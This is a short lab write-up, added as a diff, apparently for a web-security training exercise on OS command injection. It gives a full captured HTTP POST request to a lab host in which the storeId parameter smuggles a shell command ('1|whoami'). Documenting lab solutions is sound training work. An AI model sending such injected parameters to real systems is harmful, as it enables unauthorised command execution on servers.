@@ -1,0 +1,20 @@
+OS command injection, simple case
+
+The solution provided is great. As a side note, in a real case scenario, look for weird POST requests where they make no sense. A GET reqiest would've worked perfectly well here.
+
+Request:
+POST /product/stock HTTP/1.1
+Host: ac061f6b1e2747c480a26910007a00f4.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: https://ac061f6b1e2747c480a26910007a00f4.web-security-academy.net
+Connection: close
+Referer: https://ac061f6b1e2747c480a26910007a00f4.web-security-academy.net/product?productId=1
+Cookie: session=xTdNf4TNvsJVxRebCZGvtptb48WvzlkV
+Upgrade-Insecure-Requests: 1
+
+productId=1&storeId=1|whoami
